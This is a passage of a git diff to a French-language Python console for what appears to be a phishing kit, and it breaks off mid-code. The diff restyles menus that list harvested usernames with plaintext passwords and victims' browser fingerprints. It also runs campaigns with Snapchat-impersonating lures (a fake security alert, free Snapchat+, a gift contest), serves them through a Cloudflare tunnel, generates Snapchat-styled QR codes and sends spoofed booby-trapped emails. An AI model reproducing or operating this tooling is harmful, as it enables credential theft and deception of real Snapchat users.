-            path = os.path.join(BASE, f"report_{now}.html")
-            with open(path, "w", encoding="utf-8") as f:
-                f.write(data)
-            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
-        except Exception as e:
-            print(f"\n  {R}✗ Erreur : {e}{X}")
+        with _spinner("Génération du rapport HTML..."):
+            try:
+                r = urllib.request.urlopen(f"{base_url}/export/report?key={k}", context=ctx, timeout=10)
+                data = r.read().decode()
+                path = os.path.join(BASE, f"report_{now}.html")
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write(data)
+                okay(f"Exporté : {path} ({len(data)} octets)")
+            except Exception as e:
+                panic(f"Erreur : {e}")
     elif c == "0":
         return
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+    pause()
 
 # ══════════════════════════════════════════════════════════════
 #  TERMINAL DASHBOARD
@@ -516,31 +761,63 @@ def export_menu():
 
 def terminal_dashboard():
     while True:
-        cls()
-        print(LOGO)
-        title_bar()
-        print()
-        print(f"  {C}╔══════════════════════════════════════════════╗{X}")
-        print(f"  {C}║            DASHBOARD INTERACTIF            ║{X}")
-        print(f"  {C}╚══════════════════════════════════════════════╝{X}")
-        print()
-        print(f"    {C}STATISTIQUES{X}")
-        print(f"    {W}[1]{X}  Vue d'ensemble")
-        print(f"    {W}[2]{X}  Credentials (masqués)")
-        print(f"    {W}[3]{X}  Credentials (mots de passe visibles)")
-        print(f"    {W}[4]{X}  Logs d'activité")
-        print(f"    {W}[5]{X}  Empreintes numériques (fingerprints)")
-        print()
-        print(f"    {M}CLASSEMENT SECRET{X}")
-        print(f"    {W}[6]{X}  Voir les votes et le classement")
-        print()
-        print(f"    {Y}EXPORT / ACTIONS{X}")
-        print(f"    {W}[7]{X}  Exporter")
-        print(f"    {R}[8]{X}  Réinitialiser")
-        print()
-        print(f"    {D}[0]{X}  Retour au menu principal")
-        print()
-        c = input(f"  {G}└─>{X} ").strip()
+        if RICH_OK:
+            console.clear()
+            logo_text = Text()
+            colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
+            for i, line in enumerate(LOGO_RAW.split('\n')):
+                logo_text.append(line + "\n", style=colors[i % len(colors)])
+            console.print(Align.center(Panel(logo_text, border_style="cyan", box=HEAVY)))
+        else:
+            cls()
+            print(LOGO_RAW)
+        build_status_bar()
+
+        if RICH_OK:
+            grid = Table.grid(padding=(0, 2))
+            grid.add_column(justify="left", style="cyan")
+            grid.add_column()
+            grid.add_row("", "[bold white]DASHBOARD INTERACTIF[/]")
+            grid.add_row("", "")
+            grid.add_row("[bold cyan]STATISTIQUES[/]")
+            grid.add_row("[white][1][/]", "Vue d'ensemble")
+            grid.add_row("[white][2][/]", "Credentials (masqués)")
+            grid.add_row("[white][3][/]", "Credentials (mots de passe visibles)")
+            grid.add_row("[white][4][/]", "Logs d'activité")
+            grid.add_row("[white][5][/]", "Empreintes numériques")
+            grid.add_row("", "")
+            grid.add_row("[bold magenta]CLASSEMENT SECRET[/]")
+            grid.add_row("[white][6][/]", "Voir les votes et le classement")
+            grid.add_row("", "")
+            grid.add_row("[bold yellow]EXPORT / ACTIONS[/]")
+            grid.add_row("[white][7][/]", "Exporter")
+            grid.add_row("[bold red][8][/]", "Réinitialiser")
+            grid.add_row("", "")
+            grid.add_row("[dim][0][/]", "[dim]Retour au menu principal[/]")
+            console.print(Panel(grid, border_style="cyan", box=ROUNDED))
+            c = Prompt.ask("[bold green]└─>[/]", default="").strip()
+        else:
+            print(f"  {C}╔{'═'*46}╗{X}")
+            print(f"  {C}║            DASHBOARD INTERACTIF            ║{X}")
+            print(f"  {C}╚{'═'*46}╝{X}")
+            print()
+            print(f"    {C}STATISTIQUES{X}")
+            print(f"    {W}[1]{X}  Vue d'ensemble")
+            print(f"    {W}[2]{X}  Credentials (masqués)")
+            print(f"    {W}[3]{X}  Credentials (mots de passe visibles)")
+            print(f"    {W}[4]{X}  Logs d'activité")
+            print(f"    {W}[5]{X}  Empreintes numériques (fingerprints)")
+            print()
+            print(f"    {M}CLASSEMENT SECRET{X}")
+            print(f"    {W}[6]{X}  Voir les votes et le classement")
+            print()
+            print(f"    {Y}EXPORT / ACTIONS{X}")
+            print(f"    {W}[7]{X}  Exporter")
+            print(f"    {R}[8]{X}  Réinitialiser")
+            print()
+            print(f"    {D}[0]{X}  Retour au menu principal")
+            print()
+            c = input(f"  {G}└─>{X} ").strip()
         if c == "1": td_stats()
         elif c == "2": td_creds(False)
         elif c == "3": td_creds(True)
@@ -550,6 +827,14 @@ def terminal_dashboard():
         elif c == "7": export_menu()
         elif c == "8": action_8_reset()
         elif c == "0": break
+
+def td_table_rich(headers, rows):
+    tbl = Table(box=SQUARE, border_style="cyan", header_style="bold cyan")
+    for h in headers:
+        tbl.add_column(h)
+    for row in rows:
+        tbl.add_row(*[str(c) for c in row])
+    console.print(tbl)
 
 def td_table(headers, rows):
     cols = len(headers)
@@ -562,7 +847,12 @@ def td_table(headers, rows):
     print("  " + " + ".join("=" * cw[i] for i in range(cols)))
 
 def td_stats():
-    cls(); print(LOGO); title_bar()
+    if RICH_OK:
+        console.clear()
+        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
+    else:
+        cls(); print(LOGO_RAW)
+    build_status_bar()
     conn = db()
     total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
     with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
@@ -572,69 +862,139 @@ def td_stats():
     voters = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM votes_top3 WHERE snap_validated=1").fetchone()[0]
     votes_count = conn.execute("SELECT COUNT(*) FROM votes_top3").fetchone()[0]
     conn.close()
-    print(f"\n  {C}STATISTIQUES{X}\n")
-    td_table(
-        ["Sessions", "Captures", "PW capturés", "Uniques", "Conversion", "Votants"],
-        [[sessions, total, with_pw, unique,
-          f"{round(total/sessions*100,1) if sessions else 0}%",
-          f"{M}{voters}{X}"]]
-    )
+
+    conv = f"{round(total/sessions*100,1)}%" if sessions else "0%"
+
+    if RICH_OK:
+        kpi = Table.grid(padding=(2, 4))
+        kpi.add_row(
+            Panel(f"[bold cyan]{total}[/]", title="Captures", border_style="cyan"),
+            Panel(f"[bold green]{with_pw}[/]", title="PW capturés", border_style="green"),
+            Panel(f"[bold yellow]{sessions}[/]", title="Sessions", border_style="yellow"),
+            Panel(f"[bold magenta]{voters}[/]", title="Votants", border_style="magenta"),
+        )
+        console.print(kpi)
+        console.print(f"[bold cyan]CONVERSION :[/] [white]{conv}[/]  |  [cyan]Pseudo uniques :[/] [white]{unique}[/]")
+    else:
+        print(f"  {C}STATISTIQUES{X}")
+        td_table(
+            ["Sessions", "Captures", "PW capturés", "Uniques", "Conversion", "Votants"],
+            [[sessions, total, with_pw, unique, conv, f"{M}{voters}{X}"]]
+        )
+
     if daily:
-        print(f"\n  {D}Derniers 7 jours :{X}")
-        mx = max(d[1] for d in daily) if daily else 1
-        for d, cnt in daily:
-            bar = "#" * max(1, int(cnt / mx * 30))
-            print(f"    {d}  {G}{bar}{X} ({cnt})")
+        if RICH_OK:
+            console.print("\n[bold]Derniers 7 jours :[/]")
+            mx = max(d[1] for d in daily) if daily else 1
+            for d, cnt in daily:
+                bar = "█" * max(1, int(cnt / mx * 30))
+                console.print(f"  [dim]{d}[/] [green]{bar}[/] [white]({cnt})[/]")
+        else:
+            print(f"\n  {D}Derniers 7 jours :{X}")
+            mx = max(d[1] for d in daily) if daily else 1
+            for d, cnt in daily:
+                bar = "#" * max(1, int(cnt / mx * 30))
+                print(f"    {d}  {G}{bar}{X} ({cnt})")
+
     if votes_count > 0:
-        print(f"\n  {M}Classement Secret : {votes_count} vote(s) dont {voters} validé(s){X}")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+        if RICH_OK:
+            console.print(f"\n[magenta]Classement Secret :[/] {votes_count} vote(s) dont {voters} validé(s)")
+        else:
+            print(f"\n  {M}Classement Secret : {votes_count} vote(s) dont {voters} validé(s){X}")
+
+    pause()
 
 def td_creds(show_pw):
-    cls(); print(LOGO); title_bar()
+    if RICH_OK:
+        console.clear()
+        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
+    else:
+        cls(); print(LOGO_RAW)
+    build_status_bar()
     conn = db()
     rows = conn.execute(
         "SELECT id, participant_id, username, password, timestamp, step FROM captured_credentials ORDER BY id DESC"
     ).fetchall()
     conn.close()
     if not rows:
-        print(f"\n  {Y}Aucune donnée.{X}\n")
-        input(f"  {D}[Appuie sur Entrée]{X}")
+        warn("Aucune donnée.")
+        pause()
         return
-    print(f"\n  {C}CREDENTIALS ({len(rows)} enregistrement(s)){X}\n")
-    for r in rows:
-        has = bool(r[3])
-        pw = f"{G}{r[3]}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
-        step = r[5] or "?"
-        color = G if has else D
-        pid_short = str(r[1] or '-')[:22]
-        user_display = str(r[2] or '-')[:22]
-        print(f"  #{r[0]:<4} {color}[{step:<8}]{X} {pid_short:<22} {user_display:<22} {pw:<20} {r[4][:19]}")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+
+    if RICH_OK:
+        tbl = Table(box=SQUARE, border_style="green", header_style="bold cyan",
+                     title=f"[cyan]CREDENTIALS ({len(rows)} enregistrement(s))[/]")
+        tbl.add_column("#", style="dim")
+        tbl.add_column("Step", style="cyan")
+        tbl.add_column("Participant")
+        tbl.add_column("Username")
+        tbl.add_column("Password")
+        tbl.add_column("Timestamp", style="dim")
+        for r in rows:
+            has = bool(r[3])
+            pw = f"[green]{r[3]}[/]" if show_pw and has else ("[green]***[/]" if has else "[dim]-[/]")
+            step = r[5] or "?"
+            tbl.add_row(str(r[0]), f"[{'green' if has else 'dim'}]{step}[/]",
+                       str(r[1] or '-')[:22], str(r[2] or '-')[:22], pw, str(r[4])[:19] if r[4] else "")
+        console.print(tbl)
+    else:
+        print(f"\n  {C}CREDENTIALS ({len(rows)} enregistrement(s)){X}\n")
+        for r in rows:
+            has = bool(r[3])
+            pw = f"{G}{r[3]}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
+            step = r[5] or "?"
+            color = G if has else D
+            pid_short = str(r[1] or '-')[:22]
+            user_display = str(r[2] or '-')[:22]
+            print(f"  #{r[0]:<4} {color}[{step:<8}]{X} {pid_short:<22} {user_display:<22} {pw:<20} {(r[4] or '')[:19]}")
+    pause()
 
 def td_logs():
-    cls(); print(LOGO); title_bar()
+    if RICH_OK:
+        console.clear()
+        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
+    else:
+        cls(); print(LOGO_RAW)
+    build_status_bar()
     conn = db()
     rows = conn.execute(
         "SELECT id, event_type, participant_id, details, timestamp FROM experiment_log ORDER BY id DESC LIMIT 40"
     ).fetchall()
     conn.close()
     if not rows:
-        print(f"\n  {Y}Aucun log.{X}\n")
-        input(f"  {D}[Appuie sur Entrée]{X}")
+        warn("Aucun log.")
+        pause()
         return
-    print(f"\n  {C}LOGS ({len(rows)} derniers){X}\n")
-    for r in rows:
-        ev = r[1][:20]
-        pid = str(r[2] or '-')[:16]
-        ts = r[4][11:19] if r[4] else "--:--:--"
-        print(f"  {ts} {C}{ev:<20}{X} {pid:<18} #{r[0]}")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+
+    if RICH_OK:
+        tbl = Table(box=SQUARE, border_style="cyan", header_style="bold cyan",
+                     title="[cyan]LOGS (40 derniers)[/]")
+        tbl.add_column("#", style="dim")
+        tbl.add_column("Heure", style="dim")
+        tbl.add_column("Événement")
+        tbl.add_column("Participant")
+        for r in rows:
+            ev = r[1][:20]
+            pid = str(r[2] or '-')[:18]
+            ts = r[4][11:19] if r[4] else "--:--:--"
+            tbl.add_row(str(r[0]), ts, ev, pid)
+        console.print(tbl)
+    else:
+        print(f"\n  {C}LOGS ({len(rows)} derniers){X}\n")
+        for r in rows:
+            ev = r[1][:20]
+            pid = str(r[2] or '-')[:16]
+            ts = r[4][11:19] if r[4] else "--:--:--"
+            print(f"  {ts} {C}{ev:<20}{X} {pid:<18} #{r[0]}")
+    pause()
 
 def td_fingerprints():
-    cls(); print(LOGO); title_bar()
+    if RICH_OK:
+        console.clear()
+        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
+    else:
+        cls(); print(LOGO_RAW)
+    build_status_bar()
     conn = db()
     rows = conn.execute(
         "SELECT id, participant_id, screen_resolution, timezone, browser_language, "
@@ -643,32 +1003,54 @@ def td_fingerprints():
     ).fetchall()
     conn.close()
     if not rows:
-        print(f"\n  {Y}Aucune empreinte.{X}\n")
-        input(f"  {D}[Appuie sur Entrée]{X}")
+        warn("Aucune empreinte.")
+        pause()
         return
-    print(f"\n  {C}FINGERPRINTS ({len(rows)} enregistrement(s)){X}\n")
-    for r in rows:
-        pid = str(r[1])[:20]
-        print(f"  #{r[0]} [{r[9]}] {C}{pid}{X}")
-        print(f"    {D}Écran :{X} {r[2]}  |  {D}Fuseau :{X} {r[3]}")
-        print(f"    {D}Langue :{X} {r[4]}  |  {D}Plateforme :{X} {r[5]}")
-        print(f"    {D}Temps :{X} {r[6]}s  |  {D}Nombre de clics :{X} {r[8]}")
-        if r[7]: print(f"    {D}Provenance :{X} {r[7]}")
-        print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+
+    if RICH_OK:
+        for r in rows:
+            pid = str(r[1])[:20]
+            tbl = Table(box=MINIMAL, border_style="cyan")
+            tbl.add_column("Info", style="cyan")
+            tbl.add_column("Valeur")
+            tbl.add_row("#", str(r[0]))
+            tbl.add_row("Step", f"[cyan]{r[9]}[/]")
+            tbl.add_row("Participant", pid)
+            tbl.add_row("Écran", str(r[2] or ''))
+            tbl.add_row("Fuseau", str(r[3] or ''))
+            tbl.add_row("Langue", str(r[4] or ''))
+            tbl.add_row("Plateforme", str(r[5] or ''))
+            tbl.add_row("Temps", f"{r[6]}s" if r[6] else '')
+            tbl.add_row("Clics", str(r[8] or 0))
+            if r[7]:
+                tbl.add_row("Provenance", str(r[7]))
+            console.print(Panel(tbl, border_style="cyan"))
+    else:
+        for r in rows:
+            pid = str(r[1])[:20]
+            print(f"  #{r[0]} [{r[9]}] {C}{pid}{X}")
+            print(f"    {D}Écran :{X} {r[2]}  |  {D}Fuseau :{X} {r[3]}")
+            print(f"    {D}Langue :{X} {r[4]}  |  {D}Plateforme :{X} {r[5]}")
+            print(f"    {D}Temps :{X} {r[6]}s  |  {D}Clics :{X} {r[8]}")
+            if r[7]: print(f"    {D}Provenance :{X} {r[7]}")
+    pause()
 
 def td_votes():
-    cls(); print(LOGO); title_bar()
+    if RICH_OK:
+        console.clear()
+        console.print(Align.center(Panel(Text(LOGO_RAW, style="magenta"), border_style="magenta", box=HEAVY)))
+    else:
+        cls(); print(LOGO_RAW)
+    build_status_bar()
     conn = db()
     ctx = ssl._create_unverified_context()
     try:
         r = urllib.request.urlopen(f"{server_url()}/api/classement", context=ctx, timeout=5)
         data = json.loads(r.read())
     except Exception as e:
-        print(f"\n  {R}Erreur de chargement : {e}{X}\n")
-        input(f"  {D}[Appuie sur Entrée]{X}")
+        panic(f"Erreur de chargement : {e}")
+        pause()
         return
-    # Also list individual votes
     votes_rows = conn.execute(
         "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 ORDER BY id DESC"
     ).fetchall()
@@ -677,170 +1059,246 @@ def td_votes():
     ranking = data.get('ranking', [])
     total_voters = data.get('total_voters', 0)
 
-    print(f"\n  {M}CLASSEMENT SECRET — {total_voters} votant(s) validé(s){X}\n")
-
-    if not ranking:
-        print(f"  {Y}Aucun vote encore.{X}")
+    if RICH_OK:
+        console.print(f"\n[bold magenta]CLASSEMENT SECRET[/] — {total_voters} votant(s) validé(s)\n")
+        if not ranking:
+            warn("Aucun vote encore.")
+        else:
+            tbl = Table(box=SQUARE, border_style="magenta", header_style="bold magenta")
+            tbl.add_column("#")
+            tbl.add_column("Nom")
+            tbl.add_column("Score")
+            for i, p in enumerate(ranking):
+                tbl.add_row(str(i+1), p['name'], f"[bold green]{p['score']} pts[/]")
+            console.print(tbl)
+        if votes_rows:
+            console.print("\n[bold]Liste des votants :[/]")
+            vtbl = Table(box=MINIMAL, border_style="dim")
+            vtbl.add_column("#", style="dim")
+            vtbl.add_column("Pseudo")
+            vtbl.add_column("Statut")
+            vtbl.add_column("Date", style="dim")
+            for v in votes_rows:
+                val = "[bold green]✓ Validé[/]" if v[2] else "[yellow]⏳ En attente[/]"
+                ts = v[3][:19] if v[3] else "--"
+                vtbl.add_row(str(v[0]), f"[cyan]{v[1] or '?'}[/]", val, ts)
+            console.print(vtbl)
     else:
-        td_table(
-            ["#", "Nom", "Score"],
-            [[i+1, r['name'], f"{G}{r['score']} pts{X}"] for i, r in enumerate(ranking)]
-        )
-
-    print(f"\n  {D}Liste des votants :{X}")
-    if not votes_rows:
-        print(f"  {Y}  Aucun.{X}")
-    else:
-        for v in votes_rows:
-            val = f"{G}✓ Validé{X}" if v[2] else f"{Y}⏳ En attente{X}"
-            ts = v[3][:19] if v[3] else "--"
-            print(f"  #{v[0]} {C}{v[1] or '?'}{X} — {val} ({ts})")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+        print(f"\n  {M}CLASSEMENT SECRET — {total_voters} votant(s) validé(s){X}\n")
+        if not ranking:
+            print(f"  {Y}Aucun vote encore.{X}")
+        else:
+            td_table(["#", "Nom", "Score"],
+                     [[i+1, r['name'], f"{G}{r['score']} pts{X}"] for i, r in enumerate(ranking)])
+        if votes_rows:
+            print(f"\n  {D}Liste des votants :{X}")
+            for v in votes_rows:
+                val = f"{G}✓ Validé{X}" if v[2] else f"{Y}⏳ En attente{X}"
+                ts = v[3][:19] if v[3] else "--"
+                print(f"  #{v[0]} {C}{v[1] or '?'}{X} — {val} ({ts})")
+    pause()
 
 # ══════════════════════════════════════════════════════════════
 #  CAMPAGNE
 # ══════════════════════════════════════════════════════════════
 
 def action_campaign():
-    """Menu campagne étape par étape."""
     scenario_id = "classement"
     server_running = False
     tunnel_url = None
-    
+
     while True:
-        cls()
-        print(LOGO)
-        print(f"  {D}{'─' * 60}{X}")
-        print(f"  {M}  🎯 LANCER UNE CAMPAGNE{X}")
-        print(f"  {D}{'─' * 60}{X}")
-        print()
-        
-        # Étape 1: Choix du scénario
+        if RICH_OK:
+            console.clear()
+            logo_text = Text()
+            colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
+            for i, line in enumerate(LOGO_RAW.split('\n')):
+                logo_text.append(line + "\n", style=colors[i % len(colors)])
+            console.print(Align.center(Panel(logo_text, border_style="magenta", box=HEAVY)))
+        else:
+            cls()
+            print(f"{Y}{LOGO_RAW}{X}")
+
         s_name, s_desc = {
             "classement": ("🏆 Classement Secret", "Jeu de vote anonyme"),
             "securite": ("🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
             "snapchat_plus": ("🎁 Snapchat+", "Offre Snapchat+ gratuite"),
             "cadeau": ("🎀 Cadeau Mystère", "Concours cadeau gagnant"),
         }.get(scenario_id, ("???", "???"))
-        
-        server_status = f"{G}● EN COURS{X}" if server_running else f"{R}○ ARRÊTÉ{X}"
-        
-        print(f"  {C}ÉTAPE 1 — Choisir un appât{X}")
-        print(f"    Scénario actuel : {Y}{s_name}{X}")
-        print(f"    {D}  {s_desc}{X}")
-        print()
-        print(f"  {C}ÉTAPE 2 — Lancer le serveur{X}")
-        print(f"    Statut : {server_status}")
-        if tunnel_url:
-            print(f"    {D}  URL : {tunnel_url}{X}")
-        print()
-        print(f"  {C}ÉTAPE 3 — Générer les outils{X}")
-        print(f"    {D}  QR code, Email spoof, Liens{X}")
-        print()
-        print(f"  {C}ÉTAPE 4 — Surveillance{X}")
-        print(f"    {D}  Watch Live, Dashboard{X}")
-        print()
-        print(f"  {D}{'─' * 60}{X}")
-        print()
-        print(f"    {G}[1]{X}  Changer de scénario")
-        print(f"    {G}[2]{X}  Démarrer le serveur")
-        if server_running:
-            print(f"    {G}[3]{X}  + Tunnel Cloudflare")
-            print(f"    {G}[4]{X}  Générer un QR code")
-            print(f"    {G}[5]{X}  Envoyer un email piégé")
-            print(f"    {G}[6]{X}  Watch Live")
-            print(f"    {G}[7]{X}  Dashboard")
-            print(f"    {G}[8]{X}  Ouvrir dans le navigateur")
-        print(f"    {G}[10]{X}  Gestion automatisée des campagnes")
-        print(f"    {R}[9]{X}  Arrêter le serveur")
-        print(f"    {D}[0]{X}  Retour au menu principal")
-        print()
-        c = input(f"  {G}└─>{X} ").strip()
-        
+
+        if RICH_OK:
+            grid = Table.grid(padding=(1, 2))
+            grid.add_column(justify="left", style="cyan")
+            grid.add_column()
+
+            grid.add_row("", "[bold magenta]🎯 LANCER UNE CAMPAGNE[/]")
+            grid.add_row("", "")
+            grid.add_row("[bold]ÉTAPE 1 — Choisir un appât[/]")
+            grid.add_row("", f"  Scénario : [yellow]{s_name}[/]")
+            grid.add_row("", f"  [dim]{s_desc}[/]")
+            grid.add_row("", "")
+            grid.add_row("[bold]ÉTAPE 2 — Lancer le serveur[/]")
+            srv_status = "[bold green]● EN COURS[/]" if server_running else "[bold red]○ ARRÊTÉ[/]"
+            grid.add_row("", f"  Statut : {srv_status}")
+            if tunnel_url:
+                grid.add_row("", f"  [dim]URL : {tunnel_url}[/]")
+            grid.add_row("", "")
+            grid.add_row("[bold]ÉTAPE 3 — Générer les outils[/]")
+            grid.add_row("", "  [dim]QR code, Email spoof, Liens[/]")
+            grid.add_row("", "")
+            grid.add_row("[bold]ÉTAPE 4 — Surveillance[/]")
+            grid.add_row("", "  [dim]Watch Live, Dashboard[/]")
+            grid.add_row("", "")
+            grid.add_row("───", "────────────")
+            grid.add_row("", "")
+            grid.add_row("[green][1][/]", "Changer de scénario")
+            grid.add_row("[green][2][/]", "Démarrer le serveur")
+            if server_running:
+                grid.add_row("[green][3][/]", "+ Tunnel Cloudflare")
+                grid.add_row("[green][4][/]", "Générer un QR code")
+                grid.add_row("[green][5][/]", "Envoyer un email piégé")
+                grid.add_row("[green][6][/]", "Watch Live")
+                grid.add_row("[green][7][/]", "Dashboard")
+                grid.add_row("[green][8][/]", "Ouvrir dans le navigateur")
+            grid.add_row("[green][10][/]", "Gestion automatisée des campagnes")
+            grid.add_row("[red][9][/]", "Arrêter le serveur")
+            grid.add_row("[dim][0][/]", "[dim]Retour au menu principal[/]")
+            console.print(Panel(grid, border_style="magenta", box=ROUNDED))
+            c = Prompt.ask("[bold green]└─>[/]", default="").strip()
+        else:
+            print(f"  {D}{'─' * 60}{X}")
+            print(f"  {M}  🎯 LANCER UNE CAMPAGNE{X}")
+            print(f"  {D}{'─' * 60}{X}")
+            print()
+            server_status = f"{G}● EN COURS{X}" if server_running else f"{R}○ ARRÊTÉ{X}"
+            print(f"  {C}ÉTAPE 1 — Choisir un appât{X}")
+            print(f"    Scénario actuel : {Y}{s_name}{X}")
+            print(f"    {D}{s_desc}{X}")
+            print()
+            print(f"  {C}ÉTAPE 2 — Lancer le serveur{X}")
+            print(f"    Statut : {server_status}")
+            if tunnel_url:
+                print(f"    {D}URL : {tunnel_url}{X}")
+            print()
+            print(f"  {C}ÉTAPE 3 — Générer les outils{X}")
+            print(f"    {D}QR code, Email spoof, Liens{X}")
+            print()
+            print(f"  {C}ÉTAPE 4 — Surveillance{X}")
+            print(f"    {D}Watch Live, Dashboard{X}")
+            print()
+            print(f"  {D}{'─' * 60}{X}\n")
+            print(f"    {G}[1]{X}  Changer de scénario")
+            print(f"    {G}[2]{X}  Démarrer le serveur")
+            if server_running:
+                print(f"    {G}[3]{X}  + Tunnel Cloudflare")
+                print(f"    {G}[4]{X}  Générer un QR code")
+                print(f"    {G}[5]{X}  Envoyer un email piégé")
+                print(f"    {G}[6]{X}  Watch Live")
+                print(f"    {G}[7]{X}  Dashboard")
+                print(f"    {G}[8]{X}  Ouvrir dans le navigateur")
+            print(f"    {G}[10]{X}  Gestion automatisée des campagnes")
+            print(f"    {R}[9]{X}  Arrêter le serveur")
+            print(f"    {D}[0]{X}  Retour au menu principal")
+            print()
+            c = input(f"  {G}└─>{X} ").strip()
+
         if c == "1":
-            # Changer scénario
-            cls(); print(LOGO)
-            print(f"\n  {C}Scénarios disponibles :{X}\n")
+            if RICH_OK:
+                console.clear()
+            else:
+                cls()
             scenarios = [
                 ("classement", "🏆 Classement Secret", "Jeu de vote anonyme"),
                 ("securite", "🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
                 ("snapchat_plus", "🎁 Snapchat+", "Offre Snapchat+ gratuite"),
                 ("cadeau", "🎀 Cadeau Mystère", "Concours cadeau gagnant"),
             ]
-            for i, (sid, sn, sd) in enumerate(scenarios, 1):
-                m = "◄" if sid == scenario_id else " "
-                print(f"    {G}[{i}]{X} {m} {sn}")
-                print(f"       {D}{sd}{X}")
-            print()
-            choix = input(f"  {G}└─>{X} ").strip()
+            if RICH_OK:
+                sg = Table.grid(padding=(1, 2))
+                sg.add_column(justify="left", style="cyan")
+                sg.add_column()
+                sg.add_row("", "[bold white]CHOISIR UN SCÉNARIO[/]")
+                sg.add_row("", "")
+                for i, (sid, sn, sd) in enumerate(scenarios, 1):
+                    m = "◄" if sid == scenario_id else " "
+                    sg.add_row(f"[green][{i}][/]", f"{m} {sn}")
+                    sg.add_row("", f"  [dim]{sd}[/]")
+                    if i < len(scenarios):
+                        sg.add_row("", "")
+                console.print(Panel(sg, border_style="green", box=ROUNDED))
+                choix = Prompt.ask("[bold green]└─>[/]", default="").strip()
+            else:
+                for i, (sid, sn, sd) in enumerate(scenarios, 1):
+                    m = "◄" if sid == scenario_id else " "
+                    print(f"    {G}[{i}]{X} {m} {sn}")
+                    print(f"       {D}{sd}{X}")
+                print()
+                choix = input(f"  {G}└─>{X} ").strip()
             mapping = {"1": "classement", "2": "securite", "3": "snapchat_plus", "4": "cadeau"}
             if choix in mapping:
                 scenario_id = mapping[choix]
-                print(f"\n  {G}✓ Scénario changé : {scenarios[int(choix)-1][1]}{X}")
-                input(f"  {D}[Appuie sur Entrée]{X}")
-                
+                okay(f"Scénario changé : {scenarios[int(choix)-1][1]}")
+            pause()
+
         elif c == "2":
-            # Démarrer serveur
             stop_tunnel()
             if start_server():
                 server_running = True
-                print(f"\n  {G}✓ Serveur démarré sur http://localhost:8080{X}")
-                print(f"  {D}  URL du scénario : http://localhost:8080/scenario/{scenario_id}{X}")
+                okay(f"Serveur démarré sur http://localhost:8080")
+                info(f"URL scénario : http://localhost:8080/scenario/{scenario_id}")
             else:
-                print(f"\n  {R}✗ Échec du démarrage{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
-            
+                panic("Échec du démarrage")
+            pause()
+
         elif c == "3" and server_running:
             tunnel_url = start_tunnel()
             if tunnel_url:
-                print(f"\n  {G}✓ Tunnel actif : {tunnel_url}{X}")
-                print(f"  {D}  URL campagne : {tunnel_url}/scenario/{scenario_id}{X}")
+                okay(f"Tunnel actif : [link={tunnel_url}]{tunnel_url}[/]")
+                info(f"URL campagne : {tunnel_url}/scenario/{scenario_id}")
             else:
-                print(f"\n  {R}✗ Tunnel échoué{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
-            
+                panic("Tunnel échoué")
+            pause()
+
         elif c == "4" and server_running:
-            # QR code
             base_url = tunnel_url or f"http://localhost:8080"
             campagne_url = f"{base_url}/scenario/{scenario_id}"
-            try:
-                exec(open(os.path.join(BASE, "tools/qr_generator.py")).read().replace("interactive_menu()", ""))
-                from tools import qr_generator as qr
-                filepath = qr.make_styled_qr(campagne_url, "snapchat")
-                print(f"\n  {G}✓ QR code généré : {filepath}{X}")
-                print(f"  {D}  Contient : {campagne_url}{X}")
-                if os.name == "nt":
-                    os.startfile(os.path.dirname(filepath))
-            except Exception as e:
-                print(f"\n  {R}✗ Erreur : {e}{X}")
-                print(f"  {Y}  → pip install qrcode[pil]{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
-            
+            with _spinner("Génération du QR code..."):
+                try:
+                    exec(open(os.path.join(BASE, "tools/qr_generator.py")).read().replace("interactive_menu()", ""))
+                    from tools import qr_generator as qr
+                    filepath = qr.make_styled_qr(campagne_url, "snapchat")
+                    okay(f"QR code généré : {filepath}")
+                    info(f"Contient : {campagne_url}")
+                    if os.name == "nt":
+                        os.startfile(os.path.dirname(filepath))
+                except Exception as e:
+                    panic(f"Erreur : {e}")
+                    warn("pip install qrcode[pil]")
+            pause()
+
         elif c == "10" and server_running:
-            # Campaign manager automatisé
             try:
                 from campaign_manager import init_campaign_db, interactive_menu as cm_menu
                 init_campaign_db()
                 cm_menu()
             except ImportError as e:
-                print(f"  {R}\n  Erreur: campaign_manager non trouve {e}{X}")
-                input(f"\n  {D}[Appuie sur Entree]{X}")
+                panic(f"campaign_manager non trouvé : {e}")
             except Exception as e:
-                print(f"  {R}\n  Erreur: {e}{X}")
-                input(f"\n  {D}[Appuie sur Entree]{X}")
+                panic(f"Erreur : {e}")
+            pause()
+
         elif c == "5" and server_running:
-            # Email spoof
             base_url = tunnel_url or f"http://localhost:8080"
             campagne_url = f"{base_url}/scenario/{scenario_id}"
-            try:
-                sys.path.insert(0, os.path.join(BASE, "tools"))
-                import email_spoofer
-                email_spoofer.interactive_menu()
-            except Exception as e:
-                print(f"\n  {R}✗ Erreur : {e}{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
-            
+            with _spinner("Préparation de l'envoi email..."):
+                try:
+                    sys.path.insert(0, os.path.join(BASE, "tools"))
+                    import email_spoofer
+                    email_spoofer.interactive_menu()
